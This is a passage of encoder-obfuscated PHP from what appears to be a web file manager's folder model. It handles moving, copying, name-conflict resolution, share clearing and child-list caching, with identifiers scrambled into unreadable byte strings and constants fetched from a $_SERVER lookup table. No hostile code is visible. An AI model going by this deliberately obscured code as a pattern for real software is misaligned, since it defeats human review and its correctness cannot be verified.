$‚ºıÜ¶ù = count($””§¹±‚); if ($‚ºıÜ¶ù == 0) { return $ÎÄÃêïƒ; } $İíùØÏó = $this->sourceInfo($ÎÄÃêïƒ); foreach ($””§¹±‚ as $É€ûÂ) { $İœÚÄëï = $this->_makeItemData($É€ûÂ, $İíùØÏó, $É€ûÂ[$„Ä…ğ´Ù[32]]); $İœÚÄëï[$„Ä…ğ´Ù[521]] = $É€ûÂ[$„Ä…ğ´Ù[521]]; $Ö“¦ÂÓ[] = $İœÚÄëï; } $this->chunkEventSet($„Ä…ğ´Ù[576], array($„Ä…ğ´Ù[577], $©™¡îŒ, $‚ºıÜ¶ù)); $this->addAll($Ö“¦ÂÓ, array(), !1); $²Æ¦±îá = $this->where(array($„Ä…ğ´Ù[432] => $ÎÄÃêïƒ))->select(); $òíŒâÉ… = $this->_childrenMakeRelation($””§¹±‚, $²Æ¦±îá); $òíŒâÉ…[$ÌÁ°ÍÛà] = $ÎÄÃêïƒ; $²Š±ëœ¨ = array(); $¨¼³›˜ö = array(); foreach ($²Æ¦±îá as $É€ûÂ) { $Ç…É‘—í = $É€ûÂ[$„Ä…ğ´Ù[402]]; $š“£ÉÄ = $this->_childrenMatch($òíŒâÉ…, $É€ûÂ, $İíùØÏó); $²Š±ëœ¨[] = array($„Ä…ğ´Ù[402], $Ç…É‘—í, $„Ä…ğ´Ù[432], $š“£ÉÄ[$„Ä…ğ´Ù[432]]); $¨¼³›˜ö[] = array($„Ä…ğ´Ù[402], $Ç…É‘—í, $„Ä…ğ´Ù[521], $š“£ÉÄ[$„Ä…ğ´Ù[521]]); $this->_copyApplyMeta($É€ûÂ, $¹åÁ¶¼Ç); if ($É€ûÂ[$„Ä…ğ´Ù[410]] != $„Ä…ğ´Ù[88]) { $¹åÁ¶¼Ç[$„Ä…ğ´Ù[566]][] = $É€ûÂ[$„Ä…ğ´Ù[468]]; } } $this->chunkEventSet($„Ä…ğ´Ù[578], array($„Ä…ğ´Ù[579], $©™¡îŒ, $‚ºıÜ¶ù)); $this->saveAll($²Š±ëœ¨); $this->chunkEventSet($„Ä…ğ´Ù[580], array($„Ä…ğ´Ù[581], $©™¡îŒ, $‚ºıÜ¶ù)); $this->saveAll($¨¼³›˜ö); return $ÎÄÃêïƒ; } private function _childrenMakeRelation($ĞşÃ÷İ, $›Š¿‰ûÌ) { $÷ÚÈ†´“ =& $_SERVER[ĞÂ¤àÓï]; $ƒ²î˜…Ç = array(); $Å…¾É¾Ç = array(); foreach ($ĞşÃ÷İ as $ú²æ¿Œ) { $ƒñ¼œÙÏ = $ú²æ¿Œ[$÷ÚÈ†´“[32]] . $÷ÚÈ†´“[8] . $ú²æ¿Œ[$÷ÚÈ†´“[521]]; $ƒ²î˜…Ç[$ƒñ¼œÙÏ] = $ú²æ¿Œ[$÷ÚÈ†´“[402]]; } foreach ($›Š¿‰ûÌ as $ú²æ¿Œ) { $ƒñ¼œÙÏ = $ú²æ¿Œ[$÷ÚÈ†´“[32]] . $÷ÚÈ†´“[8] . $ú²æ¿Œ[$÷ÚÈ†´“[521]]; $á´ÈÔ¯¿ = $ƒ²î˜…Ç[$ƒñ¼œÙÏ]; $Å…¾É¾Ç[$á´ÈÔ¯¿] = $ú²æ¿Œ[$÷ÚÈ†´“[402]]; } return $Å…¾É¾Ç; } private function _childrenMatch($€úæ˜¹Á, $ò£°˜Ä, $×æšôÄÄ) { $±ÎÎéÔ’ =& $_SERVER[ĞÂ¤àÓï]; $Æ°ß´±ä = $×æšôÄÄ[$±ÎÎéÔ’[521]]; $İ›÷¡²ï = $this->parentLevelArray($ò£°˜Ä[$±ÎÎéÔ’[521]]); foreach ($İ›÷¡²ï as $³à¶¼¯ó) { if (isset($€úæ˜¹Á[$³à¶¼¯ó])) { $Æ°ß´±ä .= $€úæ˜¹Á[$³à¶¼¯ó] . $±ÎÎéÔ’[582]; } } $Æ°ß´±ä = rtrim($Æ°ß´±ä, $±ÎÎéÔ’[50]) . $±ÎÎéÔ’[50]; $ÉÉ˜·€” = $this->parentLevelArray($Æ°ß´±ä); $°à„±… = $ÉÉ˜·€”[count($ÉÉ˜·€”) - 1]; return array($±ÎÎéÔ’[432] => $°à„±…, $±ÎÎéÔ’[521] => $Æ°ß´±ä); } private function _makeItemData($åØåûù…, $Ğó¯—¢Œ, $£Ÿêí) { $ÂœŸ¸å =& $_SERVER[ĞÂ¤àÓï]; $¢—Ïåó = array($ÂœŸ¸å[583] => $åØåûù…[$ÂœŸ¸å[410]], $ÂœŸ¸å[420] => $£Ÿêí, $ÂœŸ¸å[584] => $åØåûù…[$ÂœŸ¸å[412]] ? $åØåûù…[$ÂœŸ¸å[412]] : $ÂœŸ¸å[12], $ÂœŸ¸å[469] => $åØåûù…[$ÂœŸ¸å[468]] ? $åØåûù…[$ÂœŸ¸å[468]] : 0, $ÂœŸ¸å[585] => $åØåûù…[$ÂœŸ¸å[76]] ? $åØåûù…[$ÂœŸ¸å[76]] : 0, $ÂœŸ¸å[586] => intval($Ğó¯—¢Œ[$ÂœŸ¸å[411]]), $ÂœŸ¸å[587] => intval($Ğó¯—¢Œ[$ÂœŸ¸å[505]]), $ÂœŸ¸å[588] => intval(USER_ID), $ÂœŸ¸å[589] => intval(USER_ID), $ÂœŸ¸å[401] => intval($Ğó¯—¢Œ[$ÂœŸ¸å[402]]), $ÂœŸ¸å[590] => $Ğó¯—¢Œ[$ÂœŸ¸å[521]] . $Ğó¯—¢Œ[$ÂœŸ¸å[402]] . $ÂœŸ¸å[50], $ÂœŸ¸å[424] => $åØåûù…[$ÂœŸ¸å[85]] ? $åØåûù…[$ÂœŸ¸å[85]] : time(), $ÂœŸ¸å[430] => 0, $ÂœŸ¸å[591] => $ÂœŸ¸å[12]); return $¢—Ïåó; } private function _copyApplyMeta($²°ÂŸÚ, &$ìú›¢Ó) { $«±¡ğè =& $_SERVER[ĞÂ¤àÓï]; $ƒôÎì’‚ = $²°ÂŸÚ[$«±¡ğè[402]]; $æÃ§­ä = $²°ÂŸÚ[$«±¡ğè[32]]; if (!isset($²°ÂŸÚ[$«±¡ğè[592]]) || !$²°ÂŸÚ[$«±¡ğè[592]] || $²°ÂŸÚ[$«±¡ğè[592]] == $«±¡ğè[197]) { $ìú›¢Ó[$«±¡ğè[568]][] = array($«±¡ğè[402], $ƒôÎì’‚, $«±¡ğè[592], short_id($ƒôÎì’‚)); } if (Input::check($æÃ§­ä, $«±¡ğè[593])) { $ìú›¢Ó[$«±¡ğè[567]][] = array($«±¡ğè[402] => $ƒôÎì’‚, $«±¡ğè[94] => $«±¡ğè[465], $«±¡ğè[374] => str_replace($«±¡ğè[53], $«±¡ğè[12], Pinyin::get($æÃ§­ä))); $ìú›¢Ó[$«±¡ğè[567]][] = array($«±¡ğè[402] => $ƒôÎì’‚, $«±¡ğè[94] => $«±¡ğè[464], $«±¡ğè[374] => Pinyin::get($æÃ§­ä, $«±¡ğè[594])); } $ìú›¢Ó[$«±¡ğè[567]][] = array($«±¡ğè[402] => $ƒôÎì’‚, $«±¡ğè[94] => $«±¡ğè[444], $«±¡ğè[374] => KodSort::makeStr($æÃ§­ä)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ƒ©êÍ™¼) { $¾¢İƒºş =& $_SERVER[ĞÂ¤àÓï]; $ã¿òö¦ğ = $this->sourceInfo($ƒ©êÍ™¼); $é½¹€Ëª = $¾¢İƒºş[595]; $ˆò¯¸«• = array($¾¢İƒºş[521] => array($¾¢İƒºş[550], $ã¿òö¦ğ[$¾¢İƒºş[521]] . $ƒ©êÍ™¼ . $¾¢İƒºş[551]), $¾¢İƒºş[431] => $this->targetIsDelete); $À¢Ğ² ù = $this->field($é½¹€Ëª)->where($ˆò¯¸«•)->select(); if (!$À¢Ğ² ù) { return; } $À¢Ğ² ù = array_to_keyvalue($À¢Ğ² ù, $¾¢İƒºş[402]); foreach ($À¢Ğ² ù as $æıç¾…â) { $­¢‡Ò‰Ç = $æıç¾…â[$¾¢İƒºş[432]]; $ƒ©êÍ™¼ = $æıç¾…â[$¾¢İƒºş[402]]; if (!isset($this->_childrenListCache[$ƒ©êÍ™¼]) && $æıç¾…â[$¾¢İƒºş[410]] == $¾¢İƒºş[88]) { $this->_childrenListCache[$ƒ©êÍ™¼] = array(); } if (!isset($this->_childrenListCache[$­¢‡Ò‰Ç])) { $this->_childrenListCache[$­¢‡Ò‰Ç] = array(); } $this->_childrenListCache[$­¢‡Ò‰Ç][$ƒ©êÍ™¼] = $æıç¾…â; $this->_childrenItemCache[$ƒ©êÍ™¼] = $æıç¾…â; } } private function _childrenListAll($ê¦éËäÛ, &$·ú®½ı¹) { $í‡¬å£ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($this->_childrenListCache[$ê¦éËäÛ])) { return; } $¥èôÙ¡ú = $this->_childrenListCache[$ê¦éËäÛ]; foreach ($¥èôÙ¡ú as $†š»ıê¹ => $™„É½ÅÌ) { $·ú®½ı¹[$†š»ıê¹] = $™„É½ÅÌ; if ($™„É½ÅÌ[$í‡¬å£[410]] == $í‡¬å£[88]) { $this->_childrenListAll($†š»ıê¹, $·ú®½ı¹); } } } private function sourceInfoCache($™øÖ²Ûß) { if (isset($this->_childrenItemCache[$™øÖ²Ûß])) { return $this->_childrenItemCache[$™øÖ²Ûß]; } return $this->sourceInfo($™øÖ²Ûß); } private function _childrenList($³Îòòê) { if (isset($this->_childrenListCache[$³Îòòê])) { return $this->_childrenListCache[$³Îòòê]; } return $this->_childrenListSelect($³Îòòê); } private function _childrenListSelect($¤®‡‚ğ) { $ÑïÕ©× =& $_SERVER[ĞÂ¤àÓï]; $Û•Üƒ¼ = array($ÑïÕ©×[432] => $¤®‡‚ğ, $ÑïÕ©×[431] => $this->targetIsDelete); $íŸŸÆ‡ = $this->where($Û•Üƒ¼)->select(); $íŸŸÆ‡ = $íŸŸÆ‡ ? $íŸŸÆ‡ : array(); $à‰ÑÌ”Ô = array_to_keyvalue($íŸŸÆ‡, $ÑïÕ©×[402]); $this->_childrenListCache[$¤®‡‚ğ] = $à‰ÑÌ”Ô; foreach ($à‰ÑÌ”Ô as $¤®‡‚ğ => $ùºÜÃù©) { $this->_childrenItemCache[$¤®‡‚ğ] = $ùºÜÃù©; } return $à‰ÑÌ”Ô; } private function fileNameExistCache($ÎâÕÍõ, $Š­ßå¦Š) { $ú×·¦ˆ =& $_SERVER[ĞÂ¤àÓï]; $Š­ßå¦Š = strtolower($Š­ßå¦Š); $©•Ÿ›Ö = $this->_childrenList($ÎâÕÍõ); foreach ($©•Ÿ›Ö as $äíÕş¶ğ) { if ($Š­ßå¦Š == strtolower($äíÕş¶ğ[$ú×·¦ˆ[32]])) { return $äíÕş¶ğ[$ú×·¦ˆ[402]]; } } return !1; } private function fileNameAutoCache($ˆÖõØ­”, $‡–¤©ÛÖ, $ô÷¶üİØ, $èÕşÓğä) { $¯•õÅÖş =& $_SERVER[ĞÂ¤àÓï]; $ÚÔ¨Ë = $this->_childrenList($ˆÖõØ­”); $…»Œ÷»Á = array_to_keyvalue($ÚÔ¨Ë, $¯•õÅÖş[12], $¯•õÅÖş[32]); return $this->fileNameAutoGet($…»Œ÷»Á, $‡–¤©ÛÖ, $ô÷¶üİØ, $èÕşÓğä); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($£‹©¡±¶, $·´àìé±, $ğŠ™ó = REPEAT_REPLACE, $Éğœíû  = '') { $ï®ºÑÑ« =& $_SERVER[ĞÂ¤àÓï]; $¬öº½Ü¿ = $this->sourceInfo($£‹©¡±¶); $Ãšª®¯¾ = $this->sourceInfo($·´àìé±); if ($¬öº½Ü¿[$ï®ºÑÑ«[432]] == $Ãšª®¯¾[$ï®ºÑÑ«[402]]) { if ($¬öº½Ü¿[$ï®ºÑÑ«[431]] == $ï®ºÑÑ«[88]) { Model($ï®ºÑÑ«[429])->restore(array($£‹©¡±¶)); } if (!$Éğœíû  || $Éğœíû  == $¬öº½Ü¿[$ï®ºÑÑ«[32]]) { return $£‹©¡±¶; } } $¼Ñ»Ü™ = $this->pathInfoMore($£‹©¡±¶); if ($this->isParentOf($£‹©¡±¶, $·´àìé±)) { return !1; } if (!$¬öº½Ü¿ || !$Ãšª®¯¾ || $Ãšª®¯¾[$ï®ºÑÑ«[410]] != $ï®ºÑÑ«[88]) { return !1; } Hook::trigger($ï®ºÑÑ«[596], $¼Ñ»Ü™); $this->targetIsDelete = intval($¬öº½Ü¿[$ï®ºÑÑ«[431]]); if ($¬öº½Ü¿[$ï®ºÑÑ«[432]] == $·´àìé± && $Éğœíû  != $¬öº½Ü¿[$ï®ºÑÑ«[32]]) { $‰ß¡ÌÜ = $this->fileNameExist($·´àìé±, $Éğœíû ); if ($‰ß¡ÌÜ && $¬öº½Ü¿[$ï®ºÑÑ«[410]] == $ï®ºÑÑ«[197]) { $ò·ğ‚Éé = $this->sourceInfo($‰ß¡ÌÜ); $“‘‡ŠÎğ = $this->fileHistory($ò·ğ‚Éé, $¬öº½Ü¿[$ï®ºÑÑ«[468]], $¬öº½Ü¿[$ï®ºÑÑ«[76]]); if (!$“‘‡ŠÎğ) { Model($ï®ºÑÑ«[471])->remove($¬öº½Ü¿[$ï®ºÑÑ«[468]]); } $this->removeNow($£‹©¡±¶, !1); $this->folderSizeReset($·´àìé±); Hook::trigger($ï®ºÑÑ«[597], $¼Ñ»Ü™); return $‰ß¡ÌÜ; } } $¡Ú‘©ğ = $Éğœíû  ? $Éğœíû  : $¬öº½Ü¿[$ï®ºÑÑ«[32]]; $this->lockMoveStart($£‹©¡±¶); $this->lockWriteStart($·´àìé±, $¡Ú‘©ğ); $œ§´âØ× = array($ï®ºÑÑ«[566] => array(), $ï®ºÑÑ«[598] => !1); $this->clearShare($£‹©¡±¶, $·´àìé±); $¶Ú²ö   = $this->fileNameExistCache($·´àìé±, $¬öº½Ü¿[$ï®ºÑÑ«[32]]); $Ø†¢ïşè = $this->_move($£‹©¡±¶, $·´àìé±, $ğŠ™ó, $œ§´âØ×, $Éğœíû ); $this->sourceCacheClear(); if ($¬öº½Ü¿[$ï®ºÑÑ«[410]] == $ï®ºÑÑ«[88] && $¶Ú²ö  ) { $this->folderSizeResetChildren($Ø†¢ïşè); } Model($ï®ºÑÑ«[199])->linkAdd($œ§´âØ×[$ï®ºÑÑ«[566]]); if ($¶Ú²ö   && $œ§´âØ×[$ï®ºÑÑ«[598]]) { $this->removeNow($£‹©¡±¶, !1); } $this->lockMoveEnd($£‹©¡±¶); $this->lockWriteEnd($·´àìé±, $¡Ú‘©ğ); $this->folderSizeReset($¬öº½Ü¿[$ï®ºÑÑ«[432]]); $this->folderSizeReset($·´àìé±); $ò–œ¢ä• = array($¬öº½Ü¿[$ï®ºÑÑ«[432]], $·´àìé±); if ($¬öº½Ü¿[$ï®ºÑÑ«[410]] == $ï®ºÑÑ«[88]) { $ò–œ¢ä•[] = $£‹©¡±¶; } $this->updateModifyTime($ò–œ¢ä•); Model($ï®ºÑÑ«[570])->eventMove($£‹©¡±¶, $¬öº½Ü¿[$ï®ºÑÑ«[432]], $·´àìé±); Hook::trigger($ï®ºÑÑ«[597], $¼Ñ»Ü™); return $Ø†¢ïşè; } private function _move($ïì…¤°‘, $õØÛõĞÂ, $¡å¥£º, &$¤î‰µü, $¥Æòõ‡ö = '') { $ÌŠå¬“° =& $_SERVER[ĞÂ¤àÓï]; $ÉÈõŸìÖ = $this->sourceInfo($ïì…¤°‘); $¶ŒÖ—ø£ = $ÉÈõŸìÖ[$ÌŠå¬“°[410]] == $ÌŠå¬“°[88]; $æ¬©Ì·‰ = $¥Æòõ‡ö ? $¥Æòõ‡ö : $ÉÈõŸìÖ[$ÌŠå¬“°[32]]; $ãõŞœ•² = $this->fileNameExistCache($õØÛõĞÂ, $æ¬©Ì·‰); $this->lockMoveStart($ïì…¤°‘); $this->lockWriteStart($õØÛõĞÂ, $æ¬©Ì·‰); if (!$ãõŞœ•²) { return $this->_moveForce($ïì…¤°‘, $õØÛõĞÂ, $æ¬©Ì·‰); } $»µôñé¹ = $ãõŞœ•²; $×©ğı•‡ = !1; if ($¶ŒÖ—ø£) { if ($¡å¥£º == REPEAT_RENAME_FOLDER) { $æ¬©Ì·‰ = $this->fileNameAuto($õØÛõĞÂ, $æ¬©Ì·‰, $¡å¥£º, $¶ŒÖ—ø£); $»µôñé¹ = $this->_moveForce($ïì…¤°‘, $õØÛõĞÂ, $æ¬©Ì·‰); } else { if ($¡å¥£º == REPEAT_RENAME_FOLDER) { $¡å¥£º = REPEAT_RENAME; } $½É«ŞÀ« = $this->_childrenListSelect($ïì…¤°‘); foreach ($½É«ŞÀ« as $îÔ¨¶Éì) { $this->_move($îÔ¨¶Éì[$ÌŠå¬“°[402]], $ãõŞœ•², $¡å¥£º, $¤î‰µü); } $×©ğı•‡ = !0; } } else { if ($¡å¥£º == REPEAT_SKIP) { $×©ğı•‡ = !0; } else { if ($¡å¥£º == REPEAT_RENAME || $¡å¥£º == REPEAT_RENAME_FOLDER) { $æ¬©Ì·‰ = $this->fileNameAuto($õØÛõĞÂ, $æ¬©Ì·‰, $¡å¥£º, $¶ŒÖ—ø£); $»µôñé¹ = $this->_moveForce($ïì…¤°‘, $õØÛõĞÂ, $æ¬©Ì·‰); } else { if ($¡å¥£º == REPEAT_REPLACE) { $ì¨—©¸â = $this->sourceInfoCache($ãõŞœ•²); $öªƒƒæ­ = $this->fileHistory($ì¨—©¸â, $ÉÈõŸìÖ[$ÌŠå¬“°[468]], $ÉÈõŸìÖ[$ÌŠå¬“°[76]]); $×©ğı•‡ = !0; if ($öªƒƒæ­) { $¤î‰µü[$ÌŠå¬“°[566]][] = $ÉÈõŸìÖ[$ÌŠå¬“°[468]]; } } } } } if ($×©ğı•‡ && !$¤î‰µü[$ÌŠå¬“°[598]]) { $¤î‰µü[$ÌŠå¬“°[598]] = !0; } return $»µôñé¹; } private function _moveForce($İê¤¹, $¸±Ü®ğ, $ŠÈáéîÔ) { $¿õÕßÖ‰ =& $_SERVER[ĞÂ¤àÓï]; $î§¨î¬“ = $this->sourceInfo($İê¤¹); $²„¹ÆÊ = $this->sourceInfo($¸±Ü®ğ); $ÅÅ•ò¿š = $î§¨î¬“[$¿õÕßÖ‰[410]] == $¿õÕßÖ‰[88]; $³•óÆŸ = array($¿õÕßÖ‰[401] => $²„¹ÆÊ[$¿õÕßÖ‰[402]], $¿õÕßÖ‰[590] => $²„¹ÆÊ[$¿õÕßÖ‰[521]] . $²„¹ÆÊ[$¿õÕßÖ‰[402]] . $¿õÕßÖ‰[50], $¿õÕßÖ‰[586] => $²„¹ÆÊ[$¿õÕßÖ‰[411]], $¿õÕßÖ‰[587] => $²„¹ÆÊ[$¿õÕßÖ‰[505]], $¿õÕßÖ‰[589] => USER_ID, $¿õÕßÖ‰[420] => $ŠÈáéîÔ); $¸Ø›‡ÁÀ = $î§¨î¬“[$¿õÕßÖ‰[411]] == SourceModel::TYPE_GROUP && $²„¹ÆÊ[$¿õÕßÖ‰[411]] == SourceModel::TYPE_GROUP && $î§¨î¬“[$¿õÕßÖ‰[505]] == $²„¹ÆÊ[$¿õÕßÖ‰[505]]; if (!$¸Ø›‡ÁÀ && $this->moveClearAuth) { Model($¿õÕßÖ‰[502])->authClear($İê¤¹); } $ÏÔ˜ô…ç = $î§¨î¬“[$¿õÕßÖ‰[431]] == $¿õÕßÖ‰[88] && $²„¹ÆÊ[$¿õÕßÖ‰[431]] != $¿õÕßÖ‰[88]; if ($ÏÔ˜ô…ç) { $³•óÆŸ[$¿õÕßÖ‰[430]] = 0; } if ($ÅÅ•ò¿š) { $—úØ¨Î = array($¿õÕßÖ‰[590] => array($¿õÕßÖ‰[550], $î§¨î¬“[$¿õÕßÖ‰[521]] . $î§¨î¬“[$¿õÕßÖ‰[402]] . $¿õÕßÖ‰[551])); $ÓİÇ¼Ñì = $î§¨î¬“[$¿õÕßÖ‰[521]] . $î§¨î¬“[$¿õÕßÖ‰[402]] . $¿õÕßÖ‰[50]; $ÖáßœÏº = $²„¹ÆÊ[$¿õÕßÖ‰[521]] . $²„¹ÆÊ[$¿õÕßÖ‰[402]] . $¿õÕßÖ‰[50] . $î§¨î¬“[$¿õÕßÖ‰[402]] . $¿õÕßÖ‰[50]; $çüÂ††” = array($¿õÕßÖ‰[590] => array($¿õÕßÖ‰[599], "\162\x65\160\154\x61\143\145\x28\x70\x61\162\145\x6e\164\114\145\x76\145\x6c\54\x27{$ÓİÇ¼Ñì}\x27\x2c\x27{$ÖáßœÏº}\x27\51"), $¿õÕßÖ‰[586] => $²„¹ÆÊ[$¿õÕßÖ‰[411]], $¿õÕßÖ‰[587] => $²„¹ÆÊ[$¿õÕßÖ‰[505]]); if ($ÏÔ˜ô…ç) { $çüÂ††”[$¿õÕßÖ‰[430]] = 0; } $this->where($—úØ¨Î)->data($çüÂ††”)->save(); } $this->where(array($¿õÕßÖ‰[417] => $İê¤¹))->data($³•óÆŸ)->save(); return $İê¤¹; } private function clearShare($÷…“Ò ¬, $ê§Úüêş) { $¡ğ÷ãã£ =& $_SERVER[ĞÂ¤àÓï]; $ğí™ËâÌ = $this->sourceInfo($÷…“Ò ¬); $®‰ÅÔÇ® = $this->sourceInfo($ê§Úüêş); if ($ğí™ËâÌ[$¡ğ÷ãã£[505]] == $®‰ÅÔÇ®[$¡ğ÷ãã£[505]] && $ğí™ËâÌ[$¡ğ÷ãã£[411]] == $¡ğ÷ãã£[600]) { return; } $÷ß’“™ = array($¡ğ÷ãã£[521] => array($¡ğ÷ãã£[550], $ğí™ËâÌ[$¡ğ÷ãã£[521]] . $÷…“Ò ¬ . $¡ğ÷ãã£[551])); $Ğ¼¡úá° = $this->field($¡ğ÷ãã£[417])->where($÷ß’“™)->getField($¡ğ÷ãã£[402], !0); if (!$Ğ¼¡úá°) { return; } $÷ß’“™ = array($¡ğ÷ãã£[402] => array($¡ğ÷ãã£[7], $Ğ¼¡úá°), $¡ğ÷ãã£[496] => 1); $¾ûä¤Äâ = Model($¡ğ÷ãã£[601])->field($¡ğ÷ãã£[489])->where($÷ß’“™)->select(); if (!$¾ûä¤Äâ) { return; } $¾ûä¤Äâ = array_to_keyvalue($¾ûä¤Äâ, $¡ğ÷ãã£[12], $¡ğ÷ãã£[489]); $÷ß’“™ = array($¡ğ÷ãã£[489] => array($¡ğ÷ãã£[7], $¾ûä¤Äâ)); Model($¡ğ÷ãã£[601])->where($÷ß’“™)->save(array($¡ğ÷ãã£[496] => 0)); Model($¡ğ÷ãã£[602])->where($÷ß’“™)->delete(); } public function copyFolderFromIO($ÑŸ ©”Œ, $Â¤Ì·ÑÓ, $¡şØé‡Ö, $®êüß·ô, $ãÕéÅÌï, $ÁëÀö• = false) { $ùšîäÙ =& $_SERVER[ĞÂ¤àÓï]; $Ñ£ÖÖ÷ = array($ùšîäÙ[567] => array(), $ùšîäÙ[568] => array(), $ùšîäÙ[566] => array(), $ùšîäÙ[603] => array()); $Ã²£ÆÌÓ = $ÁëÀö• ? $ÁëÀö• : $ÑŸ ©”Œ->pathThis($Â¤Ì·ÑÓ); $êÚÖø¯Ë = $this->fileNameExist($¡şØé‡Ö, $Ã²£ÆÌÓ); $Ã±’»Ã = $this->mkdir($¡şØé‡Ö, $Ã²£ÆÌÓ, $®êüß·ô); if (!$êÚÖø¯Ë || $®êüß·ô == REPEAT_RENAME_FOLDER) { $®êüß·ô = !1; } if ($êÚÖø¯Ë) { $this->_childrenAllMake($êÚÖø¯Ë); } Hook::trigger($ùšîäÙ[604]); $this->_copyChildTo($ÑŸ ©”Œ, $Â¤Ì·ÑÓ, $Ã±’»Ã, $®êüß·ô, $Ñ£ÖÖ÷, $ãÕéÅÌï); Hook::trigger($ùšîäÙ[605]); if ($Ã±’»Ã) { $this->folderSizeResetChildren($Ã±’»Ã); } $this->_childrenListClear(); Model($ùšîäÙ[569])->addAll($Ñ£ÖÖ÷[$ùšîäÙ[567]], array(), !0); Model($ùšîäÙ[570])->eventCopy($Ã±’»Ã); $this->saveAll($Ñ£ÖÖ÷[$ùšîäÙ[568]]); Model($ùšîäÙ[471])->linkAdd($Ñ£ÖÖ÷[$ùšîäÙ[566]]); Model($ùšîäÙ[471])->remove($Ñ£ÖÖ÷[$ùšîäÙ[603]]); $this->folderSizeReset($¡şØé‡Ö); $this->updateModifyTime($¡şØé‡Ö); return $Ã±’»Ã; } private function _copyChildTo($§ƒœËËÅ, $•ø““²‚, $º“èœù„, $§Ëè™°Û, &$Ùõè¢, $Æ’±®÷é) { $ı…ó¤Ùì =& $_SERVER[ĞÂ¤àÓï]; $àááàåÅ = $this->sourceInfoCache($º“èœù„); $Ë§ò©Ê¾ = $§ƒœËËÅ->listPath($•ø““²‚); $Ë§ò©Ê¾ = $Ë§ò©Ê¾ ? $Ë§ò©Ê¾ : array($ı…ó¤Ùì[83] => array(), $ı…ó¤Ùì[82] => array()); $Éå”š„‰ = array_merge($Ë§ò©Ê¾[$ı…ó¤Ùì[83]], $Ë§ò©Ê¾[$ı…ó¤Ùì[82]]); $°ŞÂìÇ¥ = $this->_addFiles($§ƒœËËÅ, $Ë§ò©Ê¾[$ı…ó¤Ùì[83]], $Æ’±®÷é); $‹…ôß‡Ë = array(); foreach ($Éå”š„‰ as &$²íšß½¿) { if (isset($°ŞÂìÇ¥[$²íšß½¿[$ı…ó¤Ùì[32]]])) { $²íšß½¿ = $°ŞÂìÇ¥[$²íšß½¿[$ı…ó¤Ùì[32]]]; } $²íšß½¿[$ı…ó¤Ùì[410]] = $²íšß½¿[$ı…ó¤Ùì[33]] == $ı…ó¤Ùì[75]; $²íšß½¿[$ı…ó¤Ùì[412]] = substr(_get($²íšß½¿, $ı…ó¤Ùì[174], $ı…ó¤Ùì[12]), 0, 10); $²íšß½¿[$ı…ó¤Ùì[76]] = _get($²íšß½¿, $ı…ó¤Ùì[76], 0); $²íšß½¿[$ı…ó¤Ùì[468]] = _get($²íšß½¿, $ı…ó¤Ùì[468], 0); if (!isset($²íšß½¿[$ı…ó¤Ùì[606]]) && $²íšß½¿[$ı…ó¤Ùì[468]]) { $Ùõè¢[$ı…ó¤Ùì[603]][] = $²íšß½¿[$ı…ó¤Ùì[468]]; } if ($§Ëè™°Û) { $½Ãº÷ÑÃ = $this->fileNameExistCache($º“èœù„, $²íšß½¿[$ı…ó¤Ùì[32]]); if ($½Ãº÷ÑÃ) { if ($²íšß½¿[$ı…ó¤Ùì[410]] || $§Ëè™°Û == REPEAT_SKIP) { continue; } if ($§Ëè™°Û == REPEAT_REPLACE) { $Ñˆô‰ˆÛ = $this->sourceInfoCache($½Ãº÷ÑÃ); $·€êìã€ = $this->fileHistory($Ñˆô‰ˆÛ, $²íšß½¿[$ı…ó¤Ùì[468]], $²íšß½¿[$ı…ó¤Ùì[76]]); if ($·€êìã€) { $Ùõè¢[$ı…ó¤Ùì[566]][] = $²íšß½¿[$ı…ó¤Ùì[468]]; } continue; } else { if ($§Ëè™°Û == REPEAT_RENAME) { $²íšß½¿[$ı…ó¤Ùì[32]] = $this->fileNameAutoCache($º“èœù„, $²íšß½¿[$ı…ó¤Ùì[32]], $§Ëè™°Û, !1); } } } } if (!$²íšß½¿[$ı…ó¤Ùì[410]] && $²íšß½¿[$ı…ó¤Ùì[468]] == 0) { continue; } if (!$²íšß½¿[$ı…ó¤Ùì[410]] && $²íšß½¿[$ı…ó¤Ùì[468]]) { $Ùõè¢[$ı…ó¤Ùì[566]][] = $²íšß½¿[$ı…ó¤Ùì[468]]; } $‹…ôß‡Ë[] = $this->_makeItemData($²íšß½¿, $àááàåÅ, $²íšß½¿[$ı…ó¤Ùì[32]]); } unset($²íšß½¿); if (!empty($‹…ôß‡Ë)) { $this->addAll($‹…ôß‡Ë); $this->_childrenListSelect($º“èœù„); } $Ö×¹¢˜ù = $this->_childrenList($º“èœù„); $Ö×¹¢˜ù = array_to_keyvalue($Ö×¹¢˜ù, $ı…ó¤Ùì[32]); foreach ($Éå”š„‰ as $²íšß½¿) { $Ñˆô‰ˆÛ = $Ö×¹¢˜ù[$²íšß½¿[$ı…ó¤Ùì[32]]]; $‘»ÑÒÙ = $Ñˆô‰ˆÛ[$ı…ó¤Ùì[402]]; $this->_copyApplyMeta($Ñˆô‰ˆÛ, $Ùõè¢); if ($²íšß½¿[$ı…ó¤Ùì[33]] == $ı…ó¤Ùì[75]) { $²íšß½¿[$ı…ó¤Ùì[84]] = $§ƒœËËÅ->getPathInner($²íšß½¿[$ı…ó¤Ùì[84]]); $this->_copyChildTo($§ƒœËËÅ, $²íšß½¿[$ı…ó¤Ùì[84]], $‘»ÑÒÙ, $§Ëè™°Û, $Ùõè¢, $Æ’±®÷é); } } } private function _addFiles($Æİğ×ğê, $¦ùÒåóÓ, $íÕ»Ôõï) { $Å¨ıõÃ« =& $_SERVER[ĞÂ¤àÓï]; if (!$¦ùÒåóÓ || count($¦ùÒåóÓ) == 0) { return array(); } $è„¥ÜÅÜ = array(); foreach ($¦ùÒåóÓ as &$æ³ƒÛ˜Ê) { Hook::trigger($Å¨ıõÃ«[607], $æ³ƒÛ˜Ê); $æ³ƒÛ˜Ê[$Å¨ıõÃ«[84]] = $Æİğ×ğê->getPathInner($æ³ƒÛ˜Ê[$Å¨ıõÃ«[84]]); $›š«ï»™ = $Æİğ×ğê->hashSimple($æ³ƒÛ˜Ê[$Å¨ıõÃ«[84]]); $¤¤»ù‰æ = $Æİğ×ğê->hashMd5($æ³ƒÛ˜Ê[$Å¨ıõÃ«[84]]); if (strlen($¤¤»ù‰æ) > 10 && !isset($è„¥ÜÅÜ[$¤¤»ù‰æ])) { 